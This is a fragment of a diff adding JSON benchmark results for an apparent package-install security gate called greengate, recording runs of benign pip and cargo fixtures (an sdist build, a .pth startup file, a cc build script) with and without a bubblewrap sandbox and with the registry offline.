+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Building goodbuild==1.0.0 from source...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-86363-1791818709026356564/built/goodbuild-1.0.0-py3-none-any.whl\nInstalling collected packages: goodbuild\nSuccessfully installed goodbuild-1.0.0\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SourceBuild] goodbuild==1.0.0 \u2014 resolving these sdists ran their build backends without isolation\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 1 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 1 sdist(s) built \u2014 not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.48
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "incomplete",
+          "exit_code": 3,
+          "seconds": 0.72,
+          "effect": false,
+          "works": false,
+          "status": "incomplete",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\n\u26a0\ufe0f  install: 2 check(s) did not complete \u2014 this is not a pass:\n  [INCOMPLETE] registry-metadata \u2014 1 release(s) not checked: goodbuild@1.0.0: http://127.0.0.1:60051/pypi/goodbuild/json: http://127.0.0.1:60051/pypi/goodbuild/json: Connection Failed: Connect error: Connection refused (os error 111)\n  [INCOMPLETE] osv-db:PyPI \u2014 OSV API failed (Failed to reach OSV API \u2014 check your network connection: http://127.0.0.1:60051/v1/querybatch: Connection Failed: Connect error: Connection refused (os error 111): Connection refused (os error 111)) and no offline snapshot \u2014 1 package(s) not checked; run `greengate db update`\n\u26a0\ufe0f  Not every check finished, and an unchecked dependency is not a safe one (`--allow-incomplete` or [policy] on_incomplete = \"warn\" continues anyway).\nInstall halted at the plan: nothing was installed.\n"
+        }
+      ]
+    },
+    {
+      "id": "pip-setuptools-pth",
+      "label": "benign",
+      "eco": "pip",
+      "description": "A wheel shipping setuptools' distutils-precedence.pth startup file",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.78,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-86554-1791818717988692158/dl/shimtools-1.0.0-py3-none-any.whl\nInstalling collected packages: shimtools\nSuccessfully installed shimtools-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 0 sdist(s) to build; 1 package(s) with startup (.pth) code: shimtools==1.0.0 (distutils-precedence.pth)\n  install:execute \u2014 1 wheel(s) installed; 0 sdist(s) built \u2014 bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.31
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.81,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-86637-1791818723060029681/dl/shimtools-1.0.0-py3-none-any.whl\nInstalling collected packages: shimtools\nSuccessfully installed shimtools-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 0 sdist(s) to build; 1 package(s) with startup (.pth) code: shimtools==1.0.0 (distutils-precedence.pth)\n  install:execute \u2014 1 wheel(s) installed; 0 sdist(s) built \u2014 bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.33
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.79,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-86730-1791818728232770392/dl/shimtools-1.0.0-py3-none-any.whl\nInstalling collected packages: shimtools\nSuccessfully installed shimtools-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 0 sdist(s) to build; 1 package(s) with startup (.pth) code: shimtools==1.0.0 (distutils-precedence.pth)\n  install:execute \u2014 1 wheel(s) installed; 0 sdist(s) built \u2014 bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.31
+          }
+        ],
+        "none": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.87,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-86819-1791818733358208531/dl/shimtools-1.0.0-py3-none-any.whl\nInstalling collected packages: shimtools\nSuccessfully installed shimtools-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 0 sdist(s) to build; 1 package(s) with startup (.pth) code: shimtools==1.0.0 (distutils-precedence.pth)\n  install:execute \u2014 1 wheel(s) installed; 0 sdist(s) built \u2014 not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.3
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.79,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-86954-1791818738595798848/dl/shimtools-1.0.0-py3-none-any.whl\nInstalling collected packages: shimtools\nSuccessfully installed shimtools-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 0 sdist(s) to build; 1 package(s) with startup (.pth) code: shimtools==1.0.0 (distutils-precedence.pth)\n  install:execute \u2014 1 wheel(s) installed; 0 sdist(s) built \u2014 not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.32
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.82,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-87085-1791818743749818344/dl/shimtools-1.0.0-py3-none-any.whl\nInstalling collected packages: shimtools\nSuccessfully installed shimtools-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 0 sdist(s) to build; 1 package(s) with startup (.pth) code: shimtools==1.0.0 (distutils-precedence.pth)\n  install:execute \u2014 1 wheel(s) installed; 0 sdist(s) built \u2014 not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.31
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "incomplete",
+          "exit_code": 3,
+          "seconds": 0.5,
+          "effect": false,
+          "works": false,
+          "status": "incomplete",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\n\u26a0\ufe0f  install: 2 check(s) did not complete \u2014 this is not a pass:\n  [INCOMPLETE] registry-metadata \u2014 1 release(s) not checked: shimtools@1.0.0: http://127.0.0.1:39819/pypi/shimtools/json: http://127.0.0.1:39819/pypi/shimtools/json: Connection Failed: Connect error: Connection refused (os error 111)\n  [INCOMPLETE] osv-db:PyPI \u2014 OSV API failed (Failed to reach OSV API \u2014 check your network connection: http://127.0.0.1:39819/v1/querybatch: Connection Failed: Connect error: Connection refused (os error 111): Connection refused (os error 111)) and no offline snapshot \u2014 1 package(s) not checked; run `greengate db update`\n\u26a0\ufe0f  Not every check finished, and an unchecked dependency is not a safe one (`--allow-incomplete` or [policy] on_incomplete = \"warn\" continues anyway).\nInstall halted at the plan: nothing was installed.\n"
+        }
+      ]
+    },
+    {
+      "id": "cargo-cc-build",
+      "label": "benign",
+      "eco": "cargo",
+      "description": "A crate whose build.rs compiles C with the cc crate",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.07,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding native-sys v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 3 packages to latest compatible versions\n\u2705 deps check: no policy violations (3 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading crate sources (cargo verifies each checksum)...\n Downloading crates ...\n  Downloaded native-sys v1.0.0 (registry `fixture`)\n  Downloaded cc v1.2.0 (registry `fixture`)\n  Downloaded shlex v1.3.0 (registry `fixture`)\n  install:plan \u2014 3 package(s) planned; release checks cover every package (nothing installed before)\n  install:fetch \u2014 cargo fetch verified every crate against its Cargo.lock checksum\n  install:inspect \u2014 1 new crate(s) run code at build time: native-sys@1.0.0 (build script)\n  install:execute \u2014 nothing ran: build scripts and proc-macros run at `cargo build`, after this gate\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.03
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.08,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding native-sys v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 3 packages to latest compatible versions\n\u2705 deps check: no policy violations (3 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading crate sources (cargo verifies each checksum)...\n Downloading crates ...\n  Downloaded native-sys v1.0.0 (registry `fixture`)\n  Downloaded cc v1.2.0 (registry `fixture`)\n  Downloaded shlex v1.3.0 (registry `fixture`)\n  install:plan \u2014 3 package(s) planned; release checks cover every package (nothing installed before)\n  install:fetch \u2014 cargo fetch verified every crate against its Cargo.lock checksum\n  install:inspect \u2014 1 new crate(s) run code at build time: native-sys@1.0.0 (build script)\n  install:execute \u2014 nothing ran: build scripts and proc-macros run at `cargo build`, after this gate\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.03
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.08,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding native-sys v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 3 packages to latest compatible versions\n\u2705 deps check: no policy violations (3 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading crate sources (cargo verifies each checksum)...\n Downloading crates ...\n  Downloaded native-sys v1.0.0 (registry `fixture`)\n  Downloaded cc v1.2.0 (registry `fixture`)\n  Downloaded shlex v1.3.0 (registry `fixture`)\n  install:plan \u2014 3 package(s) planned; release checks cover every package (nothing installed before)\n  install:fetch \u2014 cargo fetch verified every crate against its Cargo.lock checksum\n  install:inspect \u2014 1 new crate(s) run code at build time: native-sys@1.0.0 (build script)\n  install:execute \u2014 nothing ran: build scripts and proc-macros run at `cargo build`, after this gate\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.03
+          }
+        ],
+        "none": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.08,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding native-sys v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 3 packages to latest compatible versions\n\u2705 deps check: no policy violations (3 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading crate sources (cargo verifies each checksum)...\n Downloading crates ...\n  Downloaded native-sys v1.0.0 (registry `fixture`)\n  Downloaded cc v1.2.0 (registry `fixture`)\n  Downloaded shlex v1.3.0 (registry `fixture`)\n  install:plan \u2014 3 package(s) planned; release checks cover every package (nothing installed before)\n  install:fetch \u2014 cargo fetch verified every crate against its Cargo.lock checksum\n  install:inspect \u2014 1 new crate(s) run code at build time: native-sys@1.0.0 (build script)\n  install:execute \u2014 nothing ran: build scripts and proc-macros run at `cargo build`, after this gate\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.03
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.08,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding native-sys v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 3 packages to latest compatible versions\n\u2705 deps check: no policy violations (3 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading crate sources (cargo verifies each checksum)...\n Downloading crates ...\n  Downloaded native-sys v1.0.0 (registry `fixture`)\n  Downloaded cc v1.2.0 (registry `fixture`)\n  Downloaded shlex v1.3.0 (registry `fixture`)\n  install:plan \u2014 3 package(s) planned; release checks cover every package (nothing installed before)\n  install:fetch \u2014 cargo fetch verified every crate against its Cargo.lock checksum\n  install:inspect \u2014 1 new crate(s) run code at build time: native-sys@1.0.0 (build script)\n  install:execute \u2014 nothing ran: build scripts and proc-macros run at `cargo build`, after this gate\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.03
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.08,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding native-sys v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 3 packages to latest compatible versions\n\u2705 deps check: no policy violations (3 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading crate sources (cargo verifies each checksum)...\n Downloading crates ...\n  Downloaded native-sys v1.0.0 (registry `fixture`)\n  Downloaded cc v1.2.0 (registry `fixture`)\n  Downloaded shlex v1.3.0 (registry `fixture`)\n  install:plan \u2014 3 package(s) planned; release checks cover every package (nothing installed before)\n  install:fetch \u2014 cargo fetch verified every crate against its Cargo.lock checksum\n  install:inspect \u2014 1 new crate(s) run code at build time: native-sys@1.0.0 (build script)\n  install:execute \u2014 nothing ran: build scripts and proc-macros run at `cargo build`, after this gate\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.03
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "incomplete",
+          "exit_code": 3,
+          "seconds": 0.03,
+          "effect": false,
+          "works": null,
+          "status": "incomplete",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: updating the lockfile (no crate code runs)...\n    Updating `fixture` index\n      Adding native-sys v1.0.0 to dependencies\n    Updating `fixture` index\n     Locking 3 packages to latest compatible versions\n\n\u26a0\ufe0f  install: 2 check(s) did not complete \u2014 this is not a pass:\n  [INCOMPLETE] registry-metadata \u2014 3 release(s) not checked: cc@1.2.0: http://127.0.0.1:46197/api/v1/crates/cc: http://127.0.0.1:46197/api/v1/crates/cc: Connection Failed: Connect error: Connection refused (os error 111); native-sys@1.0.0: http://127.0.0.1:46197/api/v1/crates/native-sys: http://127.0.0.1:46197/api/v1/crates/native-sys: Connection Failed: Connect error: Connection refused (os error 111); shlex@1.3.0: http://127.0.0.1:46197/api/v1/crates/shlex: http://127.0.0.1:46197/api/v1/crates/shlex: Connection Failed: Connect error: Connection refused (os error 111)\n  [INCOMPLETE] osv-db:crates.io \u2014 OSV API failed (Failed to reach OSV API \u2014 check your network connection: http://127.0.0.1:46197/v1/querybatch: Connection Failed: Connect error: Connection refused (os error 111): Connection refused (os error 111)) and no offline snapshot \u2014 3 package(s) not checked; run `greengate db update`\n\u26a0\ufe0f  Not every check finished, and an unchecked dependency is not a safe one (`--allow-incomplete` or [policy] on_incomplete = \"warn\" continues anyway).\nInstall halted at the plan: Cargo.toml and Cargo.lock were restored; nothing was fetched.\n"
+        }
+      ]
+    }
+  ]
+}
